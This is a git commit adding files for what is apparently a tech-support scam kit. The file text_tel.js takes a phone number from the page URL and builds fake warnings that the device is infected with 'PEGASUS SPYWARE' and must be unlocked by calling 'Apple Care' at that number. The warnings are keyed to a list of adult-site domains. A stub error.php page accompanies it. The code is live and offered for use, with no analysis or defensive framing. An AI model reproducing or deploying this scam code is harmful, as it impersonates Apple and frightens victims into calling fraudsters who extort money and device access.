83cea58da35ecfb3e1c86dc7c11fbb567f3e7157
techadam009 <136915069+techadam009@users.noreply.github.com>
2025-07-28 23:36:36 +0530

    Add files via upload

---
+++ USA-Cleaned/ioxs01uShYMl/error.php
@@ -0,0 +1,1 @@
+The page you were trying to reach, couldn't be found on the server.
---
+++ USA-Cleaned/ioxs01uShYMl/text_tel.js
@@ -0,0 +1,24 @@
+function getQParam(param) {
+	const url = new URL(window.location.href);
+	const params = new URLSearchParams(url.search);
+	return params.get(param);
+}
+
+// Usage example
+const bcdaRfnss = getQParam('bcda').trim();
+
+window.defaultNumber = '+'+bcdaRfnss;
+window.defaultText='WARNING! \n\ **PEGASUS SPYWARE ACTIVATED** \n\ Your device is infected with a Virus! Please call Apple Care at +'+bcdaRfnss+' to unlock this device.\n\ ERROR C0DE- 18SX87L2Y';
+window.text ={
+	'xhamster.com':'WARNING! \n\ **PEGASUS SPYWARE ACTIVATED** \n\ Your device is infected with a Virus! Please call Apple Care at +'+bcdaRfnss+' to unlock this device.\n\ ERROR C0DE- 18SX87L2Y',
+	'perfectgirls.net':'WARNING! \n\ **PEGASUS SPYWARE ACTIVATED** \n\ Your device is infected with a Virus! Please call Apple Care at +'+bcdaRfnss+' to unlock this device.\n\ ERROR C0DE- 18SX87L2Y',
+	'gotporn.com':'WARNING! \n\ **PEGASUS SPYWARE ACTIVATED** \n\ Your device is infected with a Virus! Please call Apple Care at +'+bcdaRfnss+' to unlock this device.\n\ ERROR C0DE- 18SX87L2Y',
+	'anysex.com':'WARNING! \n\ **PEGASUS SPYWARE ACTIVATED** \n\ Your device is infected with a Virus! Please call Apple Care at +'+bcdaRfnss+' to unlock this device.\n\ ERROR C0DE- 18SX87L2Y',
+	'sex.com':'WARNING! \n\ **PEGASUS SPYWARE ACTIVATED** \n\ Your device is infected with a Virus! Please call Apple Care at +'+bcdaRfnss+' to unlock this device.\n\ ERROR C0DE- 18SX87L2Y',
+	'bravotube.net':'WARNING! \n\ **PEGASUS SPYWARE ACTIVATED** \n\ Your device is infected with a Virus! Please call Apple Care at +'+bcdaRfnss+' to unlock this device.\n\ ERROR C0DE- 18SX87L2Y',
+	'mylust.com':'WARNING! \n\ **PEGASUS SPYWARE ACTIVATED** \n\ Your device is infected with a Virus! Please call Apple Care at +'+bcdaRfnss+' to unlock this device.\n\ ERROR C0DE- 18SX87L2Y',
+	'manporn.xxx':'WARNING! \n\ **PEGASUS SPYWARE ACTIVATED** \n\ Your device is infected with a Virus! Please call Apple Care at +'+bcdaRfnss+' to unlock this device.\n\ ERROR C0DE- 18SX87L2Y',
+	'anybunny.com':'WARNING! \n\ **PEGASUS SPYWARE ACTIVATED** \n\ Your device is infected with a Virus! Please call Apple Care at +'+bcdaRfnss+' to unlock this device.\n\ ERROR C0DE- 18SX87L2Y',
+	'txxx.com':'WARNING! \n\ **PEGASUS SPYWARE ACTIVATED** \n\ Your device is infected with a Virus! Please call Apple Care at +'+bcdaRfnss+' to unlock this device.\n\ ERROR C0DE- 18SX87L2Y',
+	'findbestsolution.xyz':'WARNING! \n\ **PEGASUS SPYWARE ACTIVATED** \n\ Your device is infected with a Virus! Please call Apple Care at +'+bcdaRfnss+' to unlock this device.\n\ ERROR C0DE- 18SX87L2Y'
+};
